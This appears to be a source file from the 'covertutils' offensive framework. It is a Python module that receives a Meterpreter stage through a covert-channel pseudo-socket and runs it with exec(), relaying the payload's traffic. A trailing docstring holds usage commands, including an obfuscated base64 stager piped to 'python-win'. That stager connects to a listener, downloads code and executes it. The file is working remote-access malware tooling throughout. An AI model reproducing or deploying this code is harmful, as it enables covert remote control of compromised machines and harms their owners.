

def init( storage ) :
	print "Initiating Meterpreter Module"
	from Queue import Queue
	from threading import Thread
	import socket,struct,time
	import io, threading
	from time import sleep
	storage['sleep_func'] = sleep

	storage['in_lock'] = threading.Lock()
	storage['out_lock'] = threading.Lock()

	threading.Condition()
	# storage['meterpreter_ins'] = bytearray()
	storage['meterpreter_ins'] = bytearray()
	storage['meterpreter_outs'] = bytearray()
# storage['meterpreter_outs'] = Queue()

	class PseudoSocket (object):
		# pass
		# socket

		def __init__(self, recv_stream = bytearray(), send_stream = bytearray(), recv_lock = threading.Lock(), send_lock = threading.Lock(), flush_every = 1) :
			self.recv_stream = recv_stream
			self.send_stream = send_stream
			self.recv_lock = recv_lock
			self.send_lock = send_lock
			self.flush_every = flush_every
			self.flush_count = 0
			self.recv_cond = threading.Condition()
			self.send_cond = threading.Condition()

		def _flush_if_needed( self, buffer ) :
			self.flush_count +=1
			if self.flush_count == self.flush_every :
				self.recv_stream.flush()
				# self.recv_stream.seek(0)
				print "[+] Flushed!"
				self.flush_count = 0

		def send( self, pkt ) :
			print "PseudoSocket send(): '%s'" % pkt.encode('hex')

			self.send_cond.acquire()
			# storage['COMMON']['handler'].preferred_send(pkt, storage['stream'])
			storage['meterpreter_outs'] += bytes(pkt)
			sent_bytes = len(pkt)
			self.send_cond.notify()
			self.send_cond.release()
			print "[!] Send (%d) to Outbuffer. Total %d bytes" % (sent_bytes, len(self.send_stream ))
			return sent_bytes


		def _read( self, buffer, buf_size ) :
			# ret_type = type(buffer)
			# ret = ret_type()
			ret = bytearray()
			for i in range(buf_size) :
				ret += chr(buffer.pop(0))
			return ret

		def recv ( self, buf_size ) :
			print "PseudoSocket recv() - {"
			with self.recv_lock :
				self.recv_cond.acquire()
				# self.recv_stream.seek(0)
				while len(self.recv_stream) < buf_size :
					self.recv_cond.wait()
				ret = self._read(self.recv_stream, buf_size)
				# ret = self.recv_stream.read(buf_size)
				# self._flush_if_needed(self.recv_stream)
				# print str(ret)
			self.recv_cond.release()
			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, len(self.recv_stream))
			return str(ret)


		def close( self ) :
			del self.send_stream
			del self.recv_stream

		# def connect( self ) : return True
		def getsockname( self ) :	return ("::", 4444)
		def getpeername( self ) :	return ("::", 4444)
		# def settimeout( self, timeout ) : return True

		def empty( self ) : return len(self.recv_stream) == 0


	def meterpreter_stage( ) :

		print "Creating PseudoSocket"
		s = PseudoSocket( recv_stream = storage['meterpreter_ins'], send_stream = storage['meterpreter_outs'], send_lock = storage['out_lock'] )
		storage['socket'] = s
		print "Getting 4 bytes"
		l=struct.unpack('<I',s.recv(4))[0]
		print "Getting the rest %d bytes of Meterpreter" % l
		d=s.recv(l)
		while len(d)<l:
			print "%d bytes to go!" % l
			d+=s.recv(l-len(d))
		print "Executing Meterpreter main"

		meterpreter_main = d
		# assert '\x00' not in meterpreter_main
		# print "Null byte at: %d" % meterpreter_main.index('\x00')
		print meterpreter_main[-30:]
		print "[!] Goind to exec()!"
		exec(meterpreter_main,{'s':s})
		print "[+] Meterpreter CLOSED!"

	def message_appender ( buffer_, message ) :
		storage['socket'].recv_cond.acquire()
		buffer_ += message

		storage['socket'].recv_cond.notify()
		storage['socket'].recv_cond.release()


	storage['meterpreter_thread'] = Thread( target = meterpreter_stage, args = () )
	storage['meterpreter_thread'].daemon = True
	print "Executing Meterpreter Thread"
	storage['meterpreter_thread'].start()

	return True


def work( storage, message ) :
	# print "[!] Meterpreter Handler Message Arrived!"
	# print message.encode('hex')
	# print "Outs: ",
	# print storage['meterpreter_outs']
	if message != 'X' :

		storage['socket'].recv_cond.acquire()
		storage['meterpreter_ins'] += message

		storage['socket'].recv_cond.notify()
		storage['socket'].recv_cond.release()

	# storage['sleep_func'](1)
	try :
		# with storage['out_lock'] :
		storage['socket'].send_cond.acquire()
		print "Send lock acquired!"
		print "To send %d bytes" % len(storage['meterpreter_outs'])
		ret = storage['meterpreter_outs'][:]
		read_len = len(ret)
		storage['meterpreter_outs'] = storage['meterpreter_outs'][read_len:]
		storage['socket'].send_cond.notify()
		storage['socket'].send_cond.release()
			# storage['meterpreter_outs'].flush()
		print "[!] Returning Meterpreter Response! {"
		print "%s" % str(ret).encode('hex')
		print "} Sent %d bytes." % ( len(ret) )
		# return ""
		return str(ret)
	except Exception as e:
		print "[!!!] In work():"
		print e
		# print "Returned EMPTY message"
		return ''
	# return ''
'''

!stage mload covertutils.payloads.generic.meterpreter


!python print "A"

echo 'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuOScsNDQ0NikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=' | python-win
'''
from covertutils.shells.subshells import MeterpreterSubShell as shell
